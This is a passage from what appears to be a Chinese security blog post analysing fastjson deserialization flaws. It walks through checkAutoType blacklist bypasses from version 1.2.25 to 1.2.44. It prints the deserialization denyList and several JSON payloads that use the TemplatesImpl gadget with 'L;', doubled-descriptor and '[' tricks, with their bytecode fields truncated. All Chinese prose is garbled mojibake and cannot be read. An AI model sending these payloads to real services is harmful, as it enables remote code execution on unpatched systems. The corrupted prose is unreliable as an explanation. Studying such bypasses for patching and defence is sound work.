<li>æ˜¯å¦ç»§æ‰¿è‡ªRowSetã€DataSourceã€ClassLoaderç­‰ç±»</li>
</ul>
<p>å¦‚æœæ»¡è¶³ä¸Šè¿°æ¡ä»¶ä¹‹ä¸€ï¼Œé‚£ä¹ˆç›´æ¥æŠ›å‡ºé”™è¯¯ å¦‚æœéƒ½ä¸æ»¡è¶³ï¼Œé‚£ä¹ˆä¼šè¿›è¡Œå¦‚ä¸‹åˆ¤æ–­:</p>
<ul>
<li>expectClassä¸ä¸ºNULLã€Objectã€Serializableã€Closeableç­‰ç±»å‹</li>
<li>ä¼ å…¥çš„typeNameç±»ç»§æ‰¿äºexpctClass</li>
</ul>
<p>å¦‚æœæ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œé‚£ä¹ˆä¼šç›´æ¥returnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½ å…¥cache</p>
<p>å¦‚æœä¸æ»¡è¶³ï¼Œé‚£ä¹ˆä¼šç»è¿‡autoTypeSupportçš„åˆ¤æ–­ï¼ŒautoTypeSupportä¸»è¦ç”¨æ¥æ‰“å¼€autotypeåŠŸèƒ½ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯falseï¼ŒæŠ›å‡ºé”™è¯¯ï¼Œå¦‚æœè®¾ç½®çš„æ˜¯Trueé‚£ä¹ˆä¼šreturnå‡ºå»ç»§ç»­æ‰§è¡Œååºåˆ—åŒ–æµ ç¨‹å¹¶ä¸”å°†æœªè½½å…¥cacheçš„ç±»è½½å…¥cacheã€‚</p>
<h2 id="å†å²æ¼æ´åˆ†æ">å†å²æ¼æ´åˆ†æ<a hidden class="anchor" aria-hidden="true" href="#å†å²æ¼æ´åˆ†æ">#</a></h2>
<h3 id="fastjson-1225">fastjson-1.2.25<a hidden class="anchor" aria-hidden="true" href="#fastjson-1225">#</a></h3>
<p>åœ¨ç‰ˆæœ¬ 1.2.25 ä¸­ï¼Œå®˜æ–¹å¯¹ä¹‹å‰çš„ååºåˆ—åŒ–æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œå¼•å…¥äº† checkAutoType å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ autoTypeSupport å…³é—­ï¼Œä¸èƒ½ç›´æ¥ååºåˆ—åŒ–ä»»æ„ç±»ï¼Œè€Œæ‰“å¼€ AutoType ä¹‹åï¼Œæ˜¯åŸºäºå†…ç½®é»‘åå•æ¥å®ç°å®‰å…¨çš„ï¼Œfastjson ä¹Ÿæä¾›äº†æ·»åŠ é»‘åå•çš„æ¥å£ã€‚</p>
<blockquote>
<p>å½±å“ç‰ˆæœ¬ï¼š<code>1.2.25 &lt;= fastjson &lt;= 1.2.41</code>
æè¿°ï¼šä½œè€…é€šè¿‡ä¸ºå±é™©åŠŸèƒ½æ·»åŠ å¼€å…³ï¼Œå¹¶æä¾›é»‘ç™½åå•ä¸¤ç§æ–¹å¼è¿›è¡Œå®‰å…¨é˜²æŠ¤ï¼Œå…¶å®å·²ç»æ˜¯ç›¸å½“å®Œæ•´çš„é˜²æŠ¤æ€è·¯ï¼Œè€Œä¸”ä½œè€…å·²ç»æ„è¯†åˆ°é»‘åå•ç±»å°†ä¼šæ— ç©·æ— å°½ï¼Œä»…ä»…é€šè¿‡ç»´æŠ¤åˆ—è¡¨æ¥é˜²æ­¢ååºåˆ—åŒ–æ¼æ´å¹¶éæœ€å¥½çš„åŠæ³•ã€‚è€Œä¸”é ç”¨æˆ·è‡ªå·±æ¥å…³æ³¨å®‰å…¨ä¿¡æ¯å»ç»´æŠ¤ä¹Ÿä¸ç°å®ã€‚</p>
</blockquote>
<p>å®‰å…¨æ›´æ–°ä¸»è¦é›†ä¸­åœ¨ <code>com.alibaba.fastjson.parser.ParserConfig</code>ï¼Œé¦–å…ˆæŸ¥çœ‹ç±»ä¸Šå‡ºç°äº†å‡ ä¸ªæˆå‘˜å˜é‡ï¼šå¸ƒå°”å‹çš„ autoTypeSupportï¼Œç”¨æ¥æ ‡è¯†æ˜¯å¦å¼€å¯ä»»æ„ç±»å‹çš„ååºåˆ—åŒ–ï¼Œå¹¶ä¸”é»˜è®¤å…³é—­ï¼›å­—ç¬¦ä¸²æ•°ç»„ denyList ï¼Œæ˜¯ååºåˆ—åŒ–ç±»çš„é»‘åå•ï¼›acceptList æ˜¯ååºåˆ—åŒ–ç™½åå•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185201750.png" alt="image-20221014185201750"  />
</p>
<p>å…¶ä¸­é»‘åå• denyList åŒ…æ‹¬ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Java" data-lang="Java"><span style="display:flex;"><span>bsh
</span></span><span style="display:flex;"><span>com.<span style="color:#007f7f">mchange</span>
</span></span><span style="display:flex;"><span>com.<span style="color:#007f7f">sun</span>.
</span></span><span style="display:flex;"><span>java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">Thread</span>
</span></span><span style="display:flex;"><span>java.<span style="color:#007f7f">net</span>.<span style="color:#007f7f">Socket</span>
</span></span><span style="display:flex;"><span>java.<span style="color:#007f7f">rmi</span>
</span></span><span style="display:flex;"><span>javax.<span style="color:#007f7f">xml</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">bcel</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">beanutils</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">collections</span>.<span style="color:#007f7f">Transformer</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">collections</span>.<span style="color:#007f7f">functors</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">collections4</span>.<span style="color:#007f7f">comparators</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">commons</span>.<span style="color:#007f7f">fileupload</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">myfaces</span>.<span style="color:#007f7f">context</span>.<span style="color:#007f7f">servlet</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">tomcat</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">apache</span>.<span style="color:#007f7f">wicket</span>.<span style="color:#007f7f">util</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">codehaus</span>.<span style="color:#007f7f">groovy</span>.<span style="color:#007f7f">runtime</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">hibernate</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">jboss</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">mozilla</span>.<span style="color:#007f7f">javascript</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">python</span>.<span style="color:#007f7f">core</span>
</span></span><span style="display:flex;"><span>org.<span style="color:#007f7f">springframework</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ·»åŠ ååºåˆ—åŒ–ç™½åå•æœ‰3ç§æ–¹æ³•ï¼š</p>
<ul>
<li>ä½¿ç”¨ä»£ç è¿›è¡Œæ·»åŠ ï¼š<code>ParserConfig.getGlobalInstance().addAccept(â€œorg.reus09.fastjson.,org.javaweb.â€)</code></li>
<li>åŠ ä¸ŠJVMå¯åŠ¨å‚æ•°ï¼š<code>-Dfastjson.parser.autoTypeAccept=org.reus09.fastjson.</code></li>
<li>åœ¨fastjson.propertiesä¸­æ·»åŠ ï¼š<code>fastjson.parser.autoTypeAccept=org.reus09.fastjson.</code></li>
</ul>
<p>ç„¶åæˆ‘ä»¬åˆ†æä¸€ä¸‹<code>1.2.25</code>ç‰ˆæœ¬ä¸‹çš„<code>check</code>æœºåˆ¶</p>
<p>é¦–å…ˆå¼€å¯<code>autoTypeSupport</code>,å…ˆæ ¹æ®ç™½åå•è¿›è¡Œåˆ¤åˆ«ï¼Œå†é€šè¿‡é»‘åå•è¿›è¡Œåˆ¤åˆ«ã€‚å¦‚æœåœ¨ï¼Œå°±ä½¿ç”¨ <code>TypeUtils.loadClass</code> åŠ è½½ï¼Œç„¶åä½¿ç”¨é»‘åå•åˆ¤æ–­ç±»åçš„å¼€å¤´ï¼Œå¦‚æœåŒ¹é…å°±æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185742097.png" alt="image-20221014185742097"  />
</p>
<p>å¦‚æœä¸Šé¢æ²¡æŸ¥è¯¢åˆ°ï¼Œé€šè¿‡<code>TypeUtils.getClassFromMapping(typeName)</code>ç¼“å­˜åˆ¤æ–­</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185914000.png" alt="image-20221014185914000"  />
</p>
<p>ç¼“å­˜é‡Œé¢çš„ç§ç±»å¦‚ä¸‹ï¼š</p>
<ul>
<li><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014185955068.png" alt="image-20221014185955068"  />
</li>
</ul>
<p>ç¼“å­˜ä¹Ÿæ²¡æœ‰ï¼Œåœ¨æ²¡æœ‰å¼€å¯<code>autoTypeSupport</code>çš„æ—¶å€™ï¼Œå…ˆè¿›å…¥é»‘åå•è¿›è¡Œåˆ¤æ–­ï¼Œç„¶ååœ¨ç™½åå•è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨ç™½åå•ï¼ŒåŒæ ·è¿›è¡Œ<code>loadlClass</code>åŠ è½½ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014190158061.png" alt="image-20221014190158061"  />
</p>
<p>æœ€åï¼Œå¦‚æœå®ƒæ˜¯ä¸ªæœŸæœ›ç±»ï¼Œå¹¶ä¸”åœ¨é»‘ç™½åå•éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼ŒåŒæ ·è°ƒç”¨<code>loadClass</code>ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014190322929.png" alt="image-20221014190322929"  />
</p>
<p>æˆ‘ä»¬é€šè¿‡åˆ†æ<code>loadClass</code>æ–¹æ³•çš„é€»è¾‘ï¼Œè¿™ä¸ªç±»åœ¨åŠ è½½ç›®æ ‡ç±»ä¹‹å‰ä¸ºäº†å…¼å®¹å¸¦æœ‰æè¿°ç¬¦çš„ç±»åï¼Œä½¿ç”¨äº†é€’å½’è°ƒç”¨æ¥å¤„ç†æè¿°ç¬¦ä¸­çš„ <code>[</code>ã€<code>L</code>ã€<code>;</code> å­—ç¬¦ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014190627499.png" alt="image-20221014190627499"  />
</p>
<p>åœ¨è¿™ä¸ªä½ç½®å‡ºç°äº†é€»è¾‘æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨å¸¦æœ‰æè¿°ç¬¦çš„ç±»ç»•è¿‡é»‘åå•çš„é™åˆ¶ï¼Œè€Œåœ¨ç±»åŠ è½½è¿‡ç¨‹ä¸­ï¼Œæè¿°ç¬¦è¿˜ä¼šè¢«å¤„ç†æ‰ã€‚å› æ­¤ï¼Œæ¼æ´åˆ©ç”¨çš„æ€è·¯å°±å‡ºæ¥äº†ï¼šéœ€è¦å¼€å¯ autoTypeï¼Œä½¿ç”¨ä»¥ä¸Šå­—ç¬¦æ¥è¿›è¡Œé»‘åå•çš„ç»•è¿‡ã€‚</p>
<p><code>payload</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014191151860.png" alt="image-20221014191151860"  />
</p>
<h3 id="fastjson-1242">fastjson-1.2.42<a hidden class="anchor" aria-hidden="true" href="#fastjson-1242">#</a></h3>
<p>åœ¨ç‰ˆæœ¬ 1.2.42 ä¸­ï¼Œfastjson ç»§ç»­å»¶ç»­äº†é»‘ç™½åå•çš„æ£€æµ‹æ¨¡å¼ï¼Œä½†æ˜¯å°†é»‘åå•ç±»ä»ç™½åå•ä¿®æ”¹ä¸ºä½¿ç”¨ HASH çš„æ–¹å¼è¿›è¡Œå¯¹æ¯”ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢å®‰å…¨ç ”ç©¶äººå‘˜æ ¹æ®é»‘åå•ä¸­çš„ç±»è¿›è¡Œåå‘ç ”ç©¶ï¼Œç”¨æ¥å¯¹æœªæ›´æ–°çš„å†å²ç‰ˆæœ¬è¿›è¡Œæ”»å‡»ã€‚åŒæ—¶ï¼Œä½œè€…å¯¹ä¹‹å‰ç‰ˆæœ¬ä¸€ç›´å­˜åœ¨çš„ä½¿ç”¨ç±»æè¿°ç¬¦ç»•è¿‡é»‘åå•æ ¡éªŒçš„é—®é¢˜å°è¯•è¿›è¡Œäº†ä¿®å¤ã€‚</p>
<blockquote>
<p>å½±å“ç‰ˆæœ¬ï¼š<code>1.2.25 &lt;= fastjson &lt;= 1.2.42</code>
æè¿°ï¼šé€šè¿‡å˜é‡å¸¸ç”¨çš„jarã€ç±»ã€å­—ç¬¦ä¸²ç¢°æ’hashå¾—åˆ°é»‘åå•</p>
</blockquote>
<p>è¿˜æ˜¯å…³æ³¨ <code>com.alibaba.fastjson.parser.ParserConfig</code> è¿™ä¸ªç±»ï¼Œä½œè€…å°†åŸæœ¬çš„æ˜æ–‡é»‘åå•è½¬ä¸ºä½¿ç”¨äº† Hash é»‘åå•ï¼Œé˜²æ­¢å®‰å…¨äººå‘˜å¯¹å…¶ç ”ç©¶ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014191639401.png" alt="image-20221014191639401"  />
</p>
<p>åŠ å¯†æ–¹å¼åœ¨<code>com.alibaba.fastjson.util.TypeUtils#fnv1a_64</code>æ˜¯æœ‰çš„</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014191756994.png" alt="image-20221014191756994"  />
</p>
<p>å¹¶ä¸”åœ¨ <code>checkAutoType</code> ä¸­åŠ å…¥åˆ¤æ–­ï¼Œå¦‚æœç±»çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ <code>L</code> ç»“å°¾æ˜¯ <code>;</code>ï¼Œåˆ™ä½¿ç”¨ <code>substring</code> è¿›è¡Œäº†å»é™¤ã€‚è¿˜æ˜¯ç”¨<code>hash</code>å†™çš„ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192010448.png" alt="image-20221014192010448"  />
</p>
<p>ä½†æ˜¯è¿™ç§åˆ¤æ–­å®Œå…¨æ˜¯å¾’åŠ³çš„ï¼Œå› ä¸ºåœ¨æœ€å<code>loadClass</code>å¤„ç†æ—¶æ˜¯é€’å½’å¤„ç†ï¼Œå› æ­¤åªè¦å¯¹æè¿°ç¬¦è¿›è¡ŒåŒå†™å³å¯ç»•è¿‡ï¼š</p>
<p><code>payload</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192149329.png" alt="image-20221014192149329"  />
</p>
<h3 id="fastjson-1243">fastjson-1.2.43<a hidden class="anchor" aria-hidden="true" href="#fastjson-1243">#</a></h3>
<p>è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­åŒå†™ç»•è¿‡çš„é—®é¢˜ã€‚</p>
<blockquote>
<p>å½±å“ç‰ˆæœ¬ï¼š1.2.25 &lt;= fastjson &lt;= 1.2.43
æè¿°ï¼šä¸Šæœ‰æ”¿ç­–ï¼Œä¸‹æœ‰å¯¹ç­–ã€‚åœ¨ Lã€; è¢«è¿›è¡Œäº†é™åˆ¶åï¼Œå®‰å…¨ç ”ç©¶äººå‘˜å°†ç›®å…‰è½¬å‘äº† [ã€‚</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°ç”¨æ¥æ£€æŸ¥çš„ <code>checkAutoType</code> ä»£ç æ·»åŠ äº†åˆ¤æ–­ï¼Œå¦‚æœç±»åè¿ç»­å‡ºç°äº†ä¸¤ä¸ª <code>L</code> å°†ä¼šæŠ›å‡ºå¼‚å¸¸</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192455393.png" alt="image-20221014192455393"  />
</p>
<p>è¿™æ ·ä½¿ç”¨ <code>L</code>ã€<code>;</code> ç»•è¿‡é»‘åå•çš„æ€è·¯å°±è¢«é˜»æŒ¡äº†ï¼Œä½†æ˜¯åœ¨ <code>loadClass</code> çš„è¿‡ç¨‹ä¸­ï¼Œè¿˜é’ˆå¯¹ <code>[</code> ä¹Ÿè¿›è¡Œäº†å¤„ç†å’Œé€’å½’.</p>
<p><code>payload</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;@type&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span>[,
</span></span><span style="display:flex;"><span>	{<span style="font-weight:bold">&#34;_bytecodes&#34;</span>: [<span style="color:#0ff;font-weight:bold">&#34;yv66vgAAADQA...CJAAk=&#34;</span>],
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_name&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>,
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_tfactory&#34;</span>: {},
</span></span><span style="display:flex;"><span>	<span style="font-weight:bold">&#34;_outputProperties&#34;</span>: {},
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014192835637.png" alt="image-20221014192835637"  />
</p>
<h3 id="fastjson-1244">fastjson-1.2.44<a hidden class="anchor" aria-hidden="true" href="#fastjson-1244">#</a></h3>
<p>è¿™ä¸ªç‰ˆæœ¬ä¸»è¦æ˜¯ä¿®å¤ä¸Šä¸€ä¸ªç‰ˆæœ¬ä¸­ä½¿ç”¨ <code>[</code> ç»•è¿‡é»‘åå•é˜²æŠ¤çš„é—®é¢˜ã€‚</p>
<blockquote>
<p>å½±å“ç‰ˆæœ¬ï¼š1.2.25 &lt;= fastjson &lt;= 1.2.44
æè¿°ï¼šåœ¨æ­¤ç‰ˆæœ¬å°† [ ä¹Ÿè¿›è¡Œä¿®å¤äº†ä¹‹åï¼Œç”±å­—ç¬¦ä¸²å¤„ç†å¯¼è‡´çš„é»‘åå•ç»•è¿‡ä¹Ÿå°±å‘Šä¸€æ®µè½äº†ã€‚</p>
</blockquote>
<p>åœ¨ <code>checkAutoType</code> ä¸­æ·»åŠ äº†æ–°çš„åˆ¤æ–­ï¼Œå¦‚æœç±»åä»¥ <code>[</code> å¼€å§‹åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221014193134227.png" alt="image-20221014193134227"  />
</p>
<p>å¯ä»¥ä½¿ç”¨åƒ<code>fastjson-1.2.45</code>çš„<code>payload byPass</code></p>
<h3 id="fastjson-1245">fastjson-1.2.45<a hidden class="anchor" aria-hidden="true" href="#fastjson-1245">#</a></h3>
